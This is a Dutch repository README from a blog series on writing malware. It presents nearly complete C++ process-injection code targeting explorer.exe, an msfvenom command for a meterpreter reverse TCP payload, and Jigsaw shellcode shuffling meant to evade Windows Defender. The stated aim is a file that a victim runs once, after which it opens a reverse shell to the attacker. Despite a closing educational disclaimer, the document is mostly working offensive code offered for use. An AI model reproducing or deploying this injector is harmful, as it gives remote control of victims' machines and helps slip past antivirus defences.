**Welkom bij de repository gebruikt tijdens de blogserie, "Mijn reis door malware-ontwikkeling". Hier kan de code gevonden worden die gebruikt is tijdens dit project.**

## Waarom C++?
Voor dit project heb ik de keuze gemaakt om malware te gaan schrijven in C++, uit mijn In-depth research bleek dat veel ransomware (malware) in de praktijk zijn geschreven in C of C++. Deze talen bieden directe toegang tot **system resources** en de **Win32 API**, waardoor ze zeer geschikt zijn voor het manipuleren van processen en geheugen. Zoals ik in deel 1 heb behandeld, is mijn kennis op gebied van softwareontwikkeling gering. De programmeertaal C ondersteunt geen klassen of objecten, waardoor het voor iemand met beperkte kennis op gebied van softwareontwikkeling heel lastig wordt. Daardoor heb ik de keuze gemaakt om voor de programmeertaal C++ te kiezen, hoewel dit een lastige taal is, heb ik besloten om de uitdaging aan te gaan. Als beginner in C++ heb ik veel geoefend, documentatie raad gepleegd (met name de documentatie van Microsoft) en verschillende iteraties gemaakt van mijn malware.

## Vereisten voor mijn Malware
Voordat ik kan beginnen met ontwikkelen moet ik eerst duidelijk hebben wat ik wil gaan ontwikkelen. Hiervoor heb ik een lijstje gemaakt van eisen en stappen waar mijn malware aan moet voldoen:

1. **Memory Injection** toepassen, ik moet de malware kunnen injecteren op een bestaand proces binnen Windows.
2. De malware moet niet (snel) te detecteren zijn door **Windows Defender**.
3. Het proces moet volledig automatisch verlopen, een slachtoffer zou alleen maar het bestand hoeven uit te voeren.
4. De malware moet een **Reverse Shell** kunnen openen naar de aanvaller in kwestie.

Genoeg introductie, nu gaan we over naar het ontwikkelen van malware!

---

> _Disclaimer_: De code is geschreven aan de hand van de volgende twee bronnen: [Malware Development: Process Injection](https://www.youtube.com/watch?v=A6EKDAKBXPs&t=2529s) en [Malware development 101: Creating your first ever MALWARE](https://www.youtube.com/watch?v=zEk3mi4Pt_E). Verder is GitHub Copilot gebruikt om de code te verbeteren. 
## Overzicht van de techniek
Zoals in de vereisten is vast gesteld wordt er voor het maken van deze malware gebruik gemaakt van **Memory Injection**, hierbij wordt er een stuk [**Shellcode**](https://www.techtarget.com/searchsecurity/answer/What-is-the-relationship-between-shellcode-and-exploit-code) in het geheugen geïnjecteerd waardoor er een **Reverse Shell** wordt geopend. Het proces bestaat uit de volgende stappen:

1. **Een handle verkrijgen naar het doelproces** door een bestaand proces te openen.
2. **Geheugen reserveren in het doelproces** met de juiste permissies.
3. **Shellcode reconstrueren en schrijven naar het toegewezen geheugen** in het proces.
4. **Een nieuwe thread starten** in het doelproces om de shellcode uit te voeren

Om dit waar te kunnen maken wordt er gebruik gemaakt van de **Win32 API**, in het komende stuk leg ik uit welke functies er gebruikt worden en wat ze precies inhouden.

## Gebruikte API-calls
>De volledige documentatie van de **API-calls** en ook de **Win32 API** zijn te vinden op de [Microsoft Documentation Pages](https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-api-list).

Voor het maken van de malware zijn de volgende **API-calls** gebruikt, deze worden hieronder in detail besproken:

- **OpenProcess**: Deze functie wordt gebruikt om een handle naar een doelproces te verkrijgen. Met een geldig handle kunnen we toegang krijgen tot het geheugen van het doelproces en het manipuleren.
- **VirtualAllocEx**: Deze API-functie reserveert geheugen in het doelproces. Het gereserveerde geheugen biedt een veilige ruimte waarin we onze shellcode kunnen plaatsen en uitvoeren.
- **WriteProcessMemory**: Hiermee schrijven we de shellcode naar de eerder toegewezen geheugenbuffer in het doelproces. Dit is een belangrijke stap om ervoor te zorgen dat onze payload klaarstaat voor uitvoering.
- **CreateRemoteThreadEx**: Deze functie start een nieuwe thread in het doelproces, die begint met de uitvoering van onze shellcode. Dit is de laatste stap in het injectieproces om de payload actief te maken.
- **CreateToolhelp32Snapshot**: Hiermee maken we een snapshot van alle actieve processen op het systeem. Deze snapshot biedt de basis voor het identificeren van het doelproces waarin we willen injecteren.
- **Process32First/Process32Next**: Met deze functies doorlopen we de processen in de snapshot, zodat we het juiste doelproces kunnen vinden op basis van de naam of andere criteria.

## Obfuscation met Jigsaw
De malware moet voorzien zijn van een **Reverse Shell**, om deze shell te creëren, heb ik gebruik gemaakt van **msfvenom**, een tool die onderdeel is van het **Metasploit Framework**. Om de **Shellcode** te genereren heb ik de volgende commando gebruikt:
```shell
msfvenom --platform --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=443 EXITFUNC=thread -f c --var-name=shellcode -o payload.bin
```

Met dit commando genereerde ik een payload die een verbinding opzet naar een specifieke host en poort, zodat een remote shell toegankelijk wordt. Omdat Metasploit een veelgebruikte en bekende tool is, zijn de gegenereerde shellcodes vaak gedetecteerd door antivirussoftware. Hier komt de tool **Jigsaw** goed van pas. Jigsaw splitst de gegenereerde shellcode in kleine stukjes en husselt deze door elkaar. De oorspronkelijke positie van elk stukje wordt opgeslagen in een aparte array, zodat de code later opnieuw kan worden opgebouwd.

[Jigsaw](https://github.com/RedSiege/Jigsaw)

De `reconstruct_shellcode` functie kan de **Shellcode** in de juiste volgorde herstellen voordat deze geïnjecteerd wordt. Hiermee kan antivirus detectie omzeild worden.
```c++
unsigned char jigsaw[511] = { 0x49, 0x5a ... 0x24 };
int positions[511] = { 159, 187 ... 147 };
int calc_len = 511;
unsigned char calc_payload[511] = { 0x00 };
int position;

void reconstruct_shellcode() {
    for (int idx = 0; idx < sizeof(positions) / sizeof(positions[0]); idx++) {
        position = positions[idx];
        calc_payload[position] = jigsaw[idx];
    }
}
```

## Een handle verkrijgen met OpenProcess
De eerste stap om **Memory Injection** toe te passen is het verkrijgen van toegang tot het proces wat we willen injecteren. Dit doen we met de functie `OpenProcess`. Met een geldige handle kunnen we het geheugen van het doelproces manipuleren, wat het mogelijk maakt om later onze **Shellcode** te kunnen injecteren.

[Memory Protection Constants](https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants)

Wanneer we `OpenProcess` aanroepen, specificeren we drie parameters:
- `dwDesiredAccess` bepaalt welke rechten we nodig hebben. In ons geval kiezen we `PROCESS_ALL_ACCESS` om volledige controle over het doelproces te verkrijgen.
- `bInheritHandle` bepaalt of **child-process** de handle mogen overnemen. Hier zetten we dit op `FALSE` omdat we alleen in het huidige proces willen werken.
- `dwProcessId` is de unieke ID van het doelproces. Dit stelt ons in staat precies dat proces te openen dat we willen manipuleren.

Wanneer `OpenProcess` succesvol is, geeft het een geldige handle terug. Als de functie faalt, retourneert het `NULL`, en kunnen we met `GetLastError` de foutcode achterhalen om te begrijpen wat er misging.

```c++
void openHandleToProcess(DWORD processID) {
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    printf("%s got a handle to the process!\n\---0x%p\n", k, hProcess);
    if (hProcess == NULL) {
        printf("%s couldn't get a handle to the process (%ld), error: %ld", e, processID, GetLastError());
    }
}
```

### Processen doorzoeken met CreateToolhelp32Snapshot
Nadat we weten welk proces we willen targeten, moeten we het proces identificeren in de lijst van actieve processen. Hiervoor gebruiken we `CreateToolhelp32Snapshot`, een functie waarmee we een snapshot maken van alle actieve processen. Ik heb ervoor gekozen om het `explorer.exe`-proces te targeten, omdat dit proces altijd actief is en geen verhoogde privileges vereist om te injecteren.

[CreateToolhelp32Snapshot function (tlhelp32.h)](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)

Wanneer de snapshot eenmaal is gemaakt, doorlopen we de processen met behulp van `Process32First` om het eerste proces op te halen, en `Process32Next` om door de lijst te gaan. Bij elk proces vergelijken we de naam met de naam van ons doelproces. Zodra we een match vinden, slaan we de process ID (PID) op en gaan we verder met de injectie.

```c++
void injectIntoProcess(const wchar_t* processName) {
    reconstruct_shellcode();

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("%s failed to create snapshot, error: %ld\n", e, GetLastError());
        return;
    }

    if (Process32First(snapshot, &pe32)) {
        do {
            if (wcscmp(pe32.szExeFile, processName) == 0) {
                openHandleToProcess(pe32.th32ProcessID);
                if (hProcess != NULL) {
                    allocateMemory();
                    if (rBuffer != NULL) {
                        writeMemory();
                        createRemoteThread();
                    }
                    cleanup();
                }
                break;
            }
        } while (Process32Next(snapshot, &pe32));
    } else {
        printf("%s failed to retrieve process list, error: %ld\n", e, GetLastError());
    }
    CloseHandle(snapshot);
}
```

### Geheugen toewijzen met VirtualAllocEx
Nadat we onze proces hebben gevonden en een handle hebben verkregen, kunnen we een geheugenbuffer toewijzen waarin de shellcode wordt geplaatst. Dit doen we met `VirtualAllocEx` functie. Deze functie reserveert en wijst geheugen toe binnen de adresruimte van het gewilde proces, wat van belang is om onze shellcode later uit te voeren.

[Memory Protection Constants](https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants)

De belangrijkste parameters van `VirtualAllocEx` zijn:
- `hProcess`: Dit is de handle (verkregen met de `OpenProcess` functie) naar het doelproces waarin we geheugen willen reserveren. 
- `lpAddress`: Het startadres van de buffer. We gebruiken hier `NULL`, zodat Windows automatisch een geschikt adres kiest.
- `dwSize`: De grootte van de buffer. Dit komt overeen met de grootte van onze shellcode.
- `flProtect`: De beschermingsinstellingen voor het geheugen. We kiezen hier voor `PAGE_EXECUTE_READWRITE` zodat het geheugen kan worden gelezen, beschreven en uitgevoerd.

```c++
void allocateMemory() {
    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(calc_payload), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", k, sizeof(calc_payload));
}
```

### Schrijven van Shellcode met WriteProcessMemory
Met de buffer klaar voor gebruik is het nu tijd om de shellcode naar het doelproces te schrijven. Dit doen we met `WriteProcessMemory`. Deze functie kopieert gegevens van ons eigen proces naar de eerder gereserveerde buffer in het doelproces.

[WriteProcessMemory function (memoryapi.h)](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)

De parameters van `WriteProcessMemory` zijn als volgt:
- `hProcess`: Dit is het handle (verkregen met de `OpenProcess` functie) naar het doelproces waarin we gegevens willen schrijven.
- `lpBaseAddress`: Het adres van de buffer in het doelproces waar de gegevens moeten worden geschreven. Dit komt overeen met de buffer die we hebben gereserveerd met `VirtualAllocEx`.
- `lpBuffer`: Een pointer naar de gegevens die we willen schrijven, in dit geval onze shellcode.
- `nSize`: De grootte van de gegevens die moeten worden geschreven. Dit komt overeen met de grootte van onze shellcode.
- `lpNumberOfBytesWritten`: Een optionele parameter die het aantal werkelijk geschreven bytes retourneert. We gebruiken hier `NULL`, omdat we deze waarde niet nodig hebben.

```c++
void writeMemory() {
    WriteProcessMemory(hProcess, rBuffer, calc_payload, sizeof(calc_payload), NULL);
    printf("%s wrote %zu-bytes to process memory\n", k, sizeof(calc_payload));
}
```

### Thread aanmaken met CreateRemoteThreadEx
De volgende stap is het starten van een nieuwe thread die de shellcode uitvoert. Hiervoor gebruiken we `CreateRemoteThreadEx`. Deze functie start een thread in het doelproces, waarbij het startadres wordt ingesteld op de locatie van onze shellcode.

[CreateRemoteThread function (processthreadsapi.h)](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)

De parameters van `CreateRemoteThreadEx` zijn als volgt:
- `hProcess`: Het handle (verkregen met de `OpenProcess` functie) naar het doelproces waarin de thread wordt aangemaakt.
- `lpThreadAttributes`: Een pointer naar een `SECURITY_ATTRIBUTES`-structuur. Hier gebruiken we `NULL` om de standaardbeveiligingsdescriptor te hanteren.
- `dwStackSize`: De grootte van de stack voor de nieuwe thread. Door dit op `0` te zetten, gebruikt de thread de standaard stackgrootte.
- `lpStartAddress`: Het startadres van de threadfunctie. Dit is de locatie van onze shellcode, gecast naar `LPTHREAD_START_ROUTINE`.
- `lpParameter`: Een optionele parameter die wordt doorgegeven aan de thread. We gebruiken hier `NULL`, aangezien onze shellcode geen extra gegevens nodig heeft.
- `dwCreationFlags`: Flags die bepalen hoe de thread wordt aangemaakt. Hier geven we `0` door, zodat de thread onmiddellijk na creatie wordt uitgevoerd.
- `lpAttributeList`: Optionele lijst met threadattributen. Voor ons doel is dit `0`.
- `lpThreadId`: Een pointer naar een variabele waarin de thread-ID wordt opgeslagen. We gebruiken hiervoor de `TID`-variable.

```c++
void createRemoteThread() {
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
    if (hThread == NULL) {
        printf("%s failed to get a handle to the thread, error: %ld", e, GetLastError());
    } else {
        printf("%s got a handle to the thread (%ld)\n\---0x%p\n", k, TID, hThread);
        waitForThread();
    }
}
```

### Wachten op threaduitvoering en opruimen
Na het starten van de thread is het belangrijk om te wachten tot de uitvoering is voltooid en vervolgens alle gebruikte resources netjes op te ruimen. Dit voorkomt geheugenlekken en andere problemen.

[WaitForSingleObject function (synchapi.h)](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)

De gebruikte functies in deze stap zijn:
De `WaitForSingleObject` functie wacht totdat de opgegeven object handle in een signal state komt. In dit geval gebruiken we het om te wachten tot de thread volledig is uitgevoerd. De parameters zijn:
-  `hHandle`: De handle naar het object (in dit geval de thread).
- `dwMilliseconds`: De maximale tijd (in milliseconden) om te wachten. Door `INFINITE` te gebruiken, wachten we totdat de thread klaar is.

[CloseHandle function (handleapi.h)](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)

De `CloseHandle` functie sluit de handle naar een object om systeembronnen vrij te maken. Hier gebruiken we het om zowel de threadhandle (`hThread`) als de proceshandle (`hProcess`) te sluiten. Het correct afsluiten van handles is cruciaal om te voorkomen dat het systeem vastloopt of bronnen lekt.

```c++
void waitForThread() {
    printf("%s waiting for thread to finish\n", i);
    WaitForSingleObject(hThread, INFINITE);
    printf("%s thread finished executing\n", k);
}

void cleanup() {
    printf("%s cleaning up\n", i);
    if (hThread != NULL) CloseHandle(hThread);
    if (hProcess != NULL) CloseHandle(hProcess);
    printf("%s finished!\n", k);
}
```

### Wat gebeurt er in de `main` functie?
De `main` functie is het startpunt van het programma, hier wordt een instance van de klasse `ProcessInjector` aangemaakt. Vervolgens wordt de methode `injectIntoProcess` aangeroepen met de naam van het doelproces, in dit geval `L"explorer.exe"`.  Zoals eerder besproken is dit proces gekozen omdat het vaak actief is en voldoende permissies heeft voor de injectie.

```c++
int main(int argc, char* argv[]) {
    ProcessInjector injector;
    injector.injectIntoProcess(L"explorer.exe");
    return EXIT_SUCCESS;
}
```

De `main` functie doet het volgende:
1. **Initialisatie van de injector**: Een object van `ProcessInjector` wordt gemaakt, dat de logica voor het injecteren bevat.
2. **Aanroepen van `injectIntoProcess`**: Dit start het proces van het injecteren van shellcode in het opgegeven doelproces.
3. **Terugkeerwaarde**: De functie eindigt met `EXIT_SUCCESS`, wat aangeeft dat het programma succesvol is uitgevoerd.

---
### Resultaat
Met de bovenstaande stappen hebben we werkende malware ontwikkeld die gebruikmaakt van **Obfuscated Shellcode** en **Memory Injection**. Door gebruik te maken van `CreateToolhelp32Snapshot` hebben we het mogelijk gemaakt om processen automatisch te identificeren en selecteren. Vervolgens hebben we de shellcode geïnjecteerd en uitgevoerd binnen het doelproces, in dit geval het `explorer.exe` proces, omdat deze altijd beschikbaar is en weinig permissies vereist. Kortom, hebben we malware ontwikkeld die antivirussoftware kan omzeilen, automatisch het door ons gewilde proces kiest, en **Obfuscated Shellcode** (Reverse Shell) kan injecteren in de memory van het `explorer.exe` proces.

>**Let op: dit project is uitsluitend bedoeld voor educatieve doeleinden en mag alleen worden uitgevoerd in een gecontroleerde omgeving.**
